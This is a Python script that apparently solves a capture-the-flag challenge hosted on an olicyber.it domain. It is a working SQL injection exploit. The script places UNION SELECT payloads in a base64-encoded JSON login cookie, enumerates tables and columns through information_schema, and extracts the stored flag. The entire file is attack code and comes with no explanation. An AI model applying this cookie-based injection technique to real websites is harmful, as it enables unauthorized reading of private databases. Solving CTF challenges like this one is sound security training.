import requests
import base64
import urllib.parse
from bs4 import BeautifulSoup


url = "http://sn4ck-sh3nan1gans.challs.olicyber.it/home.php"

def sendRequest (idPayload, sqlPayload): 
    payload = idPayload + sqlPayload + '"}'
    #encode the payload in base 64
    payload = base64.b64encode(payload.encode('ascii')).decode('ascii')
    #url encode
    payload = urllib.parse.quote(payload)

    cookies = {
        "login": payload
    }

    r = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(r.text, 'html.parser')
    h1 = soup.find('h1')
    h1 = h1.contents[0].replace("Welcome ", "")[:-1]
    print(h1)  
    return h1


payloadID = '{"ID": "1 '

tablePayload = 'UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 1'

tableName = sendRequest(payloadID, tablePayload)

columnPayload = "UNION SELECT column_name FROM information_schema.columns WHERE table_name='" + tableName + "' LIMIT 1 OFFSET 1"

columnName = sendRequest(payloadID, columnPayload)

flagPayload = "UNION SELECT " + columnName + " FROM " + tableName + " LIMIT 1 OFFSET 1"

flag = sendRequest(payloadID, flagPayload)